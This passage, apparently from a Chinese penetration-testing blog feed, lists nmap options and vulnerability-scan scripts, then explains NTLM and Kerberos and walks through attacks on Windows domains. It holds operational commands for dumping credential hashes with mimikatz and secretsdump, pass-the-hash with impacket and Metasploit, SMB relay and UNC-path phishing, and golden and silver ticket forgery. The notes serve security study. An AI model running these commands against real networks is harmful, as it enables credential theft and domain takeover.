源地址欺骗</span><br><span class="line"><span class="operator">-</span>e interface 使用指定的接口</span><br><span class="line"><span class="operator">-</span>g<span class="operator">/</span> <span class="comment">--source-port PROTNUM 使用指定源端口</span></span><br><span class="line"><span class="comment">--proxies url1,[url2],... 使用HTTP或者SOCKS4的代理</span></span><br><span class="line"><span class="comment">--data-length NUM 填充随机数据让数据包长度达到NUM</span></span><br><span class="line"><span class="comment">--ip-options OPTIONS 使用指定的IP选项来发送数据包</span></span><br><span class="line"><span class="comment">--ttl VALUE 设置IP time-to-live域</span></span><br><span class="line"><span class="comment">--spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装</span></span><br><span class="line"><span class="comment">--badsum 使用错误的checksum来发送数据包</span></span><br></pre></td></tr></table></figure><h2 id="Nmap输入"><a href="#Nmap输入" class="headerlink" title="Nmap输入"></a>Nmap输入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>iL ip.txt  从文件加载目标扫描</span><br></pre></td></tr></table></figure><h2 id="Nmap输出"><a href="#Nmap输出" class="headerlink" title="Nmap输出"></a>Nmap输出</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span><span class="keyword">oN</span> 将标准输出直接写入指定的文件</span><br><span class="line"><span class="operator">-</span>oX 输出xml文件</span><br><span class="line"><span class="operator">-</span>oS 将所有的输出都改为大写</span><br><span class="line"><span class="operator">-</span>oG 输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line"><span class="operator">-</span>oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line"><span class="operator">-</span>v 提高输出信息的详细度</span><br><span class="line"><span class="operator">-</span>d level 设置debug级别,最高是<span class="number">9</span></span><br><span class="line"><span class="comment">--reason 显示端口处于带确认状态的原因</span></span><br><span class="line"><span class="comment">--open 只输出端口状态为open的端口</span></span><br><span class="line"><span class="comment">--packet-trace 显示所有发送或者接收到的数据包</span></span><br><span class="line"><span class="comment">--iflist 显示路由信息和接口,便于调试</span></span><br><span class="line"><span class="comment">--log-errors 把日志等级为errors/warings的日志输出</span></span><br><span class="line"><span class="comment">--append-output 追加到指定的文件</span></span><br><span class="line"><span class="comment">--resume FILENAME 恢复已停止的扫描</span></span><br><span class="line"><span class="comment">--stylesheet PATH/URL 设置XSL样式表，转换XML输出</span></span><br><span class="line"><span class="comment">--webxml 从namp.org得到XML的样式</span></span><br><span class="line"><span class="comment">--no-sytlesheet 忽略XML声明的XSL样式表</span></span><br></pre></td></tr></table></figure><h2 id="其他nmap选项"><a href="#其他nmap选项" class="headerlink" title="其他nmap选项"></a>其他nmap选项</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-6</span> 开启IPv6</span><br><span class="line"><span class="operator">-</span>A OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line"><span class="comment">--datedir DIRNAME 说明用户Nmap数据文件位置</span></span><br><span class="line"><span class="comment">--send-eth / --send-ip 使用原以太网帧发送/在原IP层发送</span></span><br><span class="line"><span class="comment">--privileged 假定用户具有全部权限</span></span><br><span class="line"><span class="comment">--unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限</span></span><br><span class="line"><span class="operator">-</span>V 打印版本信息</span><br><span class="line"><span class="operator">-</span>h 输出帮助<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h2 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-sC 根据端口识别的服务,调用默认脚本</span><br><span class="line">--script=”Lua scripts” 调用的脚本名</span><br><span class="line">--script-args=n1=v1,[n2=v2] 调用的脚本传递的参数</span><br><span class="line">--script-args-file=filename 使用文本传递参数</span><br><span class="line">--script-trace 显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb 更新脚本的数据库</span><br><span class="line">--script-help=”Lua script” 显示指定脚本的帮助</span><br><span class="line">nmap -sV --script=ssl-heartbleed target_ip 扫描心脏滴血漏洞</span><br><span class="line">nmap -p 6379 --script redis-info target_ip扫描redis未授权访问漏洞</span><br><span class="line">nmap -p 27017 --script mongodb-info target_ip 扫描mongodb未授权访问漏洞</span><br><span class="line">nmap -p 21 --script ftp-anon.nse -v target_ip 扫描ftp匿名访问的漏洞</span><br><span class="line">nmap -p 21 --script ftp-brute.nse -v target_ip 对目标IP进行ftp弱口令爆破</span><br><span class="line">nmap -p 22 --script ssh-brute.nse -v target_ip 对目标IP进行ssh口令爆破</span><br><span class="line">nmap -p445 –script smb-vuln-ms17-010 target_ip/mask 对目标网段进行永恒之蓝漏洞扫描</span><br><span class="line">nmap --script参数使用。 写出示例，扫描心脏滴血，扫描redis未授权，扫描ftp匿名访问，扫描永恒之蓝</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/1/"/>
      <url>/posts/1/</url>
      
        <content type="html"><![CDATA[<h2 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h2><p>NTLM认证机制在工作组环境下和在域环境下是不同的, 域环境下有两套认证体系,默认使用Kerberos,当kerberos 认证错误时则采用NTLM认证</p><p><strong>Windows如何判断域登陆OR本地登陆</strong>(NTLM&amp;Kerberos选择)</p><p>如果是本地用户登录的话将会使用本地数据库进行认证，如果是域登录的话将会丢给Kerberos SSP去认证。当用户按下键盘Crt+Alt+Del后，Winlogon读取完用户的身份凭据后，把它交给本地安全机构（LSA）<strong>LSASS.exe</strong>，LSA会对凭证做一系列安全加密编码操作如MD4加密，加密结束后会通过SSPI(安全支持提供者接口，该接口负责与Kerberos和NTLM服务沟通)来判断是应该交给Ntlm处理，还是Kerberos SSPI进行处理。LSA首先根据用户输入UPN等信息会事先把身份认证请求传递到Kerberos SSP。</p><p>Kerberos SSP验证用户登入目标是本地计算机还是域，如果是域则继续向下处理，如果是本地计算机则会向SSPI返回一条错误消息，SSPi将它将这个任务交回给GINA处理。</p><p>SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM （Local Security Account Manager，本地安全账户管理器）数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。</p><p><strong>总结:</strong></p><p>无论是域登录还是本地登录(NTLM&amp;Kerberos) 都会在本地由winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)-&gt;认证成功后舍弃明文密码,保存哈希,都存在抓取本地hash.</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><strong>工作组环境NTLM认证流程</strong></p><p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)-&gt;认证成功后舍弃明文密码,保存哈希</p><ol><li>首先用户在客户端输入username、password，然后客户端会先将用户输入的password进行hash计算并保存在本地，舍<br>弃明文密码</li><li>客户端将username明文传输到服务器</li><li>然后服务器会随机生成16字节的challenge挑战码返回给客户端</li><li>客户端接收到challenge之后，会用第一步生成的hash对challenge进行加密（称为response），和challenge、<br>username一起发送给服务器</li><li>服务器在接收到客户端发来的response、challenge、username，会拿着username在自己的SAM文件中查询出对应的<br>hash，并用hash对challenage客户端发来的response进行对比，相同则身份验证成功</li></ol><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172808022.png" alt="image-20220222172808022"></p><p><strong>域环境NTLM认证流程：</strong></p><ol><li>首先用户在客户端输入username、password，然后客户端会先将用户输入的password进行hash计算并保存在本<br>地，舍弃明文密码</li><li>客户端将username明文传输到服务器</li><li>然后服务器会随机生成16字节的challenge挑战码返回给客户端。</li><li>客户端接收到challenge之后，会用第一步生成的hash对challenge进行加密（称为response），和challenge、<br>username一起发送给服务器</li><li>服务端将客户端发来的信息转发给域控</li><li>域控在接收到服务端发来的response、challenge、username，会拿着username在自己的活动目录数据库<br>（ntds.dit）中查询出对应的hash，并用hash对challenage进行一次加密，再与客户端发来的response进行对比，相<br>同则身份验证成功</li></ol><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172849823.png" alt="image-20220222172849823"></p><h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><h4 id="域的Hash获取"><a href="#域的Hash获取" class="headerlink" title="域的Hash获取"></a>域的Hash获取</h4><p>与普通PC的Hash获取思路是一样的，但是要注意两个事情</p><ol><li>即使是DC,常规获取hash的思路依然只能获取本地用户的hash，并不能获取整个域的用户hash</li><li>即使是域内用户机，常规获取hash的思路依然有可能拿到域管理员的hash，只要域管理员通过RDP登录过，就会将hash保存到 lsass 中</li></ol><ul><li>Secretsdump脚本直接导出域Hash</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py 账号:密码@IP地址</span><br></pre></td></tr></table></figure><p>其他常见的获取方法:</p><p>1.NTDS.dit 获取域控hash（手动导出NTDS.dit、工具：NTDSDumpEx）</p><p>2.VSSADMIN（卷影拷贝服务）</p><p>3.Mimikatz的 dcsync 功能</p><h4 id="哈希传递攻击-PTH"><a href="#哈希传递攻击-PTH" class="headerlink" title="哈希传递攻击 (PTH)"></a>哈希传递攻击 (<strong>PTH</strong>)</h4><ul><li>利用impacket工具包等..： </li></ul><p>smbexec.py / psexec.py / wmiexec.py / atexec.py </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法： smbexec.py [domain/] username @ [Target IP Address] –hashes 哈希值</span><br><span class="line"></span><br><span class="line">smbexec.py domain/Administrator@192.168.10.2 -hashes aad3b435b51404eeaad3b435b51404ee:99d85d9d737629f593b11771123df22c </span><br></pre></td></tr></table></figure><ul><li>mimikatz的 pth 功能 </li></ul><p>语句： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:账号 /domain:密码 /ntlm:获取到的NTLM</span><br></pre></td></tr></table></figure><p>在弹出cmd后，可以使用net use列出远程主机中的内容 sekurlsa::pth /user:账号 /domain:密码 /ntlm:获取到的NTLM</p><p>利用 msf 模块：</p><p> • exploit/windows/smb/psexec</p><p> • exploit/windows/smb/psexec_psh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set rhost IP地址</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbuser 用户名</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbdomain 域名</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbpass 密码的hash值</span><br></pre></td></tr></table></figure><h4 id="SMB重放攻击-中间人攻击"><a href="#SMB重放攻击-中间人攻击" class="headerlink" title="SMB重放攻击 (中间人攻击)"></a>SMB重放攻击 (中间人攻击)</h4><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/wKg0C158JVKASUlFAADWfRa5rDk155.jpg" alt="img"></p><p><strong>重放攻击的ntlm认证过程</strong>：</p><ol><li>Client端还是正常向服务端发送登录请求，由于client端此时并不知道攻击者的存在，它以为请求是发送给了server端，但<br>实际上它是先发给了攻击者</li><li>然后攻击者再拿着这个用户名伪装成client端发送给server端，此时server端正常返回一个challenge（挑战码）</li><li>攻击者拿到这个challenge（挑战码）以后，再把它返回给client端</li><li>而 client 端拿到 challenge 在本地和自己的密码DES加密以后，会把这个response再次发送给攻击者，此时client依然认<br>为攻击者就是server端</li><li>最后，攻击者会拿着client端发过来的这个response再把它交给server端去验证</li><li>server端此时到自己的数据库中对比，发现hash一致认证通过, 可见一次简单的smb中间人攻击就这样完成了</li></ol><p><strong>原理:</strong></p><p>先欺骗SMB流量,后重放, 通过内网嗅探欺骗 利用获取的传输中的NET NTML hash.拿到NET NTML hash后可以代替<strong>对方</strong>直接impacket等工具登录.执行命令 </p><p><strong>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash</strong> 格式为 username::domain:Challenge:HMAC-MD5:blob 这三个值就是相当于欺骗了凭证.</p><p>攻击者充当客户端的服务器，并充当服务器的客户端。他从客户端消息中提取NTLM身份验证Blob，并将其放入服务器的修改后的消息中，反之亦然。最后，他可以根据需要使用经过身份验证的会话。</p><p><strong>利用条件:</strong></p><ul><li>目标机不能开启smb签名，否则利用无效，一般情况下 <strong>Windows Server 机器会默认开启</strong>，而Windows [win7/8/8.1/10]<br>默认不会开启</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以利用nmap探测smb是否关闭</span><br><span class="line">nmap -sT -p <span class="number">445</span> -Pn --open --script smb-security-<span class="built_in">mode</span>.nse 目标IP</span><br></pre></td></tr></table></figure><ul><li>一些打了ms08-068[KB957097]补丁的老系统，如 Windows xp/2003 以下的系统，也无法利用</li></ul><p><strong>利用工具:</strong></p><p> impacket 套件中的 smbrelayx.py，进行smb中继攻击监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 目标机IP地址 –e 木马路径</span><br></pre></td></tr></table></figure><p>当目标机器 使用登录smb服务时,我们捕捉到了smb 的登录凭证hash 可以使用Hashcat破解就行了。</p><p>之后拿着这个hash到目标机器中去尝试登录smb执行命令上线马子.</p><p><strong>拓展：</strong></p><p>在实际渗透过程中，往往会配合钓鱼进行，红队经常这么玩。</p><p>1、在共享上放置特殊的目录，当用户点到这个目录的时候会自动请求攻击的SMB</p><p>2、可以通过在 Client 经常访问的 Web 网站上插入 UNC 路径, 例如 <img src="\\192.168.1.2\logo.jpg" /> 以进行 SMB 请求 (当前用户凭据).</p><p>3、在doc或邮件正文里插入文件，然后将相应的链接改为UNC路径（类似这种\servername\sharename格式），通过内网邮件发送给对方</p><p>4、利用PDF的GoTobe和GoToR功能让对方打开PDF时自动请求SMB服务器上的文件等等。一般企业内部员工看到内部的邮件或公用共享文件夹会放松警惕，当点开之后，当前用户密码登录凭证已经被人拿到。<br>参考文章：<a href="https://cloud.tencent.com/developer/news/200028">https://cloud.tencent.com/developer/news/200028</a></p><p>5、metasploit中的auxiliary/docx/word_unc_injector会创建一个带有unc路径的word文件，当该文件被打开的时候攻击机器的msf上就会收到NTLMv2 hash。</p><h2 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h2><p>kerberos认证涉及到三方</p><p>1.访问服务的client</p><p>2.提供服务的server</p><p>3.KDC密钥分发中心,KDC分为AS和TGS</p><p><strong>KDC密钥分发中心</strong></p><p><strong>AS</strong>(Authentication Server)</p><p>AS的作用就是验证Client端的身份(确定你是身份证本人),验证通过后就会给你一张TGT票给Client.</p><p><strong>TGS</strong>(Ticket Granting Server)</p><p>TGS的作用是通过AS发送给Client的票(TGT)换取访问Server的票(ST)</p><h3 id="认证流程-1"><a href="#认证流程-1" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172950947.png" alt="image-20220222172950947"></p><p><strong>过程简述</strong></p><p>①-②：<code>Client</code>向<code>kerberos</code>服务请求，希望获取访问<code>Server</code>的权限。 <code>kerberos</code>得到了这个消息，首先得判断<code>Client</code>是否是可信赖的， 也就是白名单黑名单的说法。</p><p>这就是<code>AS(Authentication Service)</code>服务完成的工作，通过在<code>AD(Account Database)</code>中存储黑名单和白名单来区分<code>Client</code>。</p><p>成功后，<code>AS(Authentication Service)</code>返回<code>TGT（Ticket Granting Ticket）</code>给<code>Client</code>。</p><p>③-④：<code>Client</code>得到了<code>TGT（Ticket Granting Ticket）</code>后，继续向<code>kerberos</code>请求，希望获取访问 <code>Server</code>的权限。<code>kerberos</code>又得到了这个消息，这时候通过<code>Client </code>消息中的<code>TGT</code>，判断出了<code>Client</code>拥有了这个权限，给了<code>Client</code>访问<code>Server</code>的权限<code>Ticket</code>。</p><p>⑤-⑥：<code>Client</code>得到<code>Ticket</code>后，终于可以成功访问<code>Server</code>。这个<code>Ticket</code>只是 针对这个<code>Server</code>，其他<code>Server</code>需要向<code>TGS(Ticket Granting Service)</code>申请。</p><p><strong>较详简述</strong></p><ol><li><strong>AS_REQ</strong>: <code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>，请求凭据是<code>Client hash</code>加密的时间戳</li><li><strong>AS_REP</strong>: <code>KDC</code>使用<code>Client hash</code>进行解密，如果结果正确就返回用<code>krbtgt hash</code>加密的<code>TGT</code>票据，<code>TGT</code>里面包含<code>PAC</code>，<code>PAC</code>包含<code>用户Client</code>的<code>sid</code>和<code>用户Client</code>所在的<code>组</code>。</li><li><strong>TGS_REQ</strong>: <code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>发起针对特定<code>Server</code>的<code>TGS_REQ</code>请求</li><li><strong>TGS_REP</strong>: <code>KDC</code>使用<code>krbtgt hash</code>进行解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]（这一步不管用户有没有访问<code>Server</code>的权限，只要<code>TGT</code>正确，就返回<code>TGS</code>票据 [<code>Ticket</code>]）</li><li><strong>AP_REQ</strong>: <code>Client</code>拿着<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></li><li><strong>AP_REP</strong>: <code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限。</li></ol><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222173025997.png" alt="image-20220222173025997"></p><p><strong>自己理解</strong></p><p>(1)client拿着自己的hash申请 向 KDC下属的AS身份认证机构 请求认证(去车站拿身份证实名)</p><p>(2)KDC下属的AS身份认证机构 审核通过后,返回用krbtgt hash<code>加密的</code>TGT`票据给client. </p><p>(3)<code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>下属的TGS去买票 要用什么服务</p><p>(4)<code>KDC</code>下属的TGS 使用<code>krbtgt hash</code>进行对拿过来的TGT凭证 解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]</p><p>(5)<code>Client</code>拿着KDC 下属的TGS给的<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></p><p>(6)<code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限.</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p><strong>黄金票据</strong></p><p><strong>原理</strong>: 问题出在第二步. 我们如果拿到krbtgt账号的 hash 就可以直接跳过 AS身份认证的部分. 直接拿着krbtgt账号的 hash去伪造 TGT票据 也就是黄金票据.</p><p><strong>伪造过程</strong></p><p>条件要求：</p><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户NTLM-HASH</li><li>伪造用户名，可以是任意用户名</li></ol><p>第一步：获取域控的 krbtgt NTLM Hash（在域控中）</p><ul><li>通过mimikatz，获取 krbtgt 的哈希值</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令：lsadump::dcsync /domain:域名/user:krbtgt</span><br><span class="line"></span><br><span class="line">mimikatz# sekurlsa::kerberos</span><br><span class="line">mimikatz# sekurlsa::logonpassword</span><br><span class="line">mimikatz# lsadump::dsync /domain:xxx.xxx.xxx /user:krbtgt</span><br></pre></td></tr></table></figure><p>第二步：生成伪造黄金票据 （在client端）</p><ul><li>得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成黄金票据 golden.kiribi，即成功伪造TGT</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令：kerberos::golden /user:伪造的用户名/domain:域名 /sid:user-sid /krbtgt:ntlmhash值 /ticket:票据名称</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：域的SID （不包括后<span class="number">3</span>位）</span><br><span class="line">/krbtgt: krbtgt 的 NTLM-HASH 值</span><br><span class="line">/ticket:生成的票据名称</span><br></pre></td></tr></table></figure><p> 第三步：获取权限（在client端）</p><p> • 清空本地票据缓存，导入伪造的票据</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kerberos::<span class="title">list</span> #查看本地保存的票据，观察<span class="title">client</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">purge</span> #清理本地票据缓存</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">ptt</span> 票据名 #导入伪造的黄金票据</span></span><br><span class="line"><span class="function"><span class="title">cmd</span>下查看 <span class="title">klist</span> # 查看票据</span></span><br><span class="line"><span class="function">* 注意：票据20分钟内有效，过期之后可以再次导入</span></span><br></pre></td></tr></table></figure><p> 第四步：利用伪造的黄金票据：（在client端）<br>• 远程登陆和执行命令。在Client端通过Psexec.exe工具来与域中其他主机进行连接，连接成功了以后，是直接返回一个cmd的交互式界面，并且是最高权限。<br>• 注意：最后进行远程登录和命令执行时，为计算机全名，不能为IP地址</p><p><strong>白银票据</strong></p><p><strong>原理</strong>: 问题出在第四步. <code>KDC</code>下属的TGS 使用<code>krbtgt hash</code>进行对拿过来的TGT凭证 解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]  .如果拿到Server账号hash就可以直接跳过 AS身份认证的部分,服务授权部分. 直接拿着Server账号hash去伪造 TS票据 也就是白银票据.</p><p><strong>特点:</strong></p><ol><li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主<br>体名称的服务帐户进行加密和签名。</li><li>白银票据是伪造TGS，这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效<br>TGS可以完全伪造PAC</li><li>攻击者需要服务帐户的NTLM hash</li><li>TGS是伪造的，所以没有和TGT通信，意味着绕过DC的身份验证。</li><li>任何事件日志都在目标服务器上。</li></ol><p><strong>条件:</strong></p><ol><li>域名称</li><li>域的 SID 值</li><li>域的服务账户的密码HASH</li><li>伪造的用户名，可以是任意用户名，一般是伪造administrator</li><li>需要访问的服务</li></ol><p>伪造过程:</p><p>第一步：用域管理员账号登录主域控，使用 mimikatz.exe 执行命令抓取hash（在域控中执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ø 命令：</span><br><span class="line">• privilege::debug</span><br><span class="line">• sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>第二步：伪造票据。得到服务账户的 HASH 之后使用 mimikatz中的kerberos::golden功能生成白银票据TGS ticket。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID值 /target:目标主机/rc4:目标主机的HASH值（NTLM）/service:需要伪造</span><br><span class="line">的服务 /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">/domain：指定域名</span><br><span class="line">/sid：sid号（除最后一部分）</span><br><span class="line">/target：目标主机计算机名</span><br><span class="line">/rc4：目标主机的hash(NTLM)</span><br><span class="line">/service：需要伪造的服务</span><br><span class="line">/user：需要伪造的用户名</span><br><span class="line">/ppt：伪造了以后直接写入到内存中</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 第二步：伪造票据。其中：白银票据对应的服务列表</p><table><thead><tr><th>服务类型</th><th>白银票据对应的服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST/RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST/HOST</td></tr><tr><td>WinRM</td><td>HOST/HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations including Mimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS/LDAP/CIFS</td></tr></tbody></table><p>第三步：利用伪造的白银票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir //dc.local\C$ </span><br></pre></td></tr></table></figure><p>生成白银票据后，再访问目标主机，无需输密码，访问成功</p><p>第三步：利用伪造的白银票据执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\dc.local cmd.exe</span><br></pre></td></tr></table></figure><p><strong>扩展:</strong></p><ul><li>白银票据的利用（扩展）：利用HOST服务修改和创建计划任务<br>需要导入一张 HOST Silver Ticket</li></ul><ol><li><p>创建 HOST Silver Ticket 银票</p></li><li><p>创建计划任务，创建完成后，查看是否添加成功。</p></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID /target:目标主机 /rc4:目标主机的hash值 /service:HOST /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure><p>  • 注意：如果现实无法加载列资源，使用命令 chcp 437 修改为美国编码即可执行</p><ul><li>白银票据的利用（扩展）：使用WMI在目标系统上远程执行命令<br>• 需要导入两张Silver Ticket，一张 host Silver Ticket，一张 rpcss Silver Ticket</li></ul><ol><li><p>首先写入两个票据</p></li><li><p>执行wmic命令，在远程主机上创建新进程</p></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID /target:目标主机 /rc4:目标主机的hash值 /service:host /user:伪造的用户名 /ptt</span><br><span class="line">kerberos::golden /domain:域名 /sid: SID /target:目标主机 /rc4:目标主机的hash值 /service:rpcss /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure><h2 id="黄金票据与白银票据的区别"><a href="#黄金票据与白银票据的区别" class="headerlink" title="黄金票据与白银票据的区别"></a>黄金票据与白银票据的区别</h2><ol><li><strong>访问权限不同：</strong><br>• 黄金票据：伪造TGT，可以获取任何Kerberos服务权限<br>• 白银票据：伪造TGS，只能访问指定的服务</li><li><strong>加密方式不同：</strong><br>• 黄金票据：由Kerberos的Hash加密<br>• 白银票据：由服务账号（通常为计算机账户）Hash加密</li><li><strong>认证流程不同：</strong><br>• 黄金票据：黄金票据的利用过程需要访问域控<br>• 白银票据：不需要认证，可以跳过KDC的认证</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/2/"/>
      <url>/posts/2/</url>
      
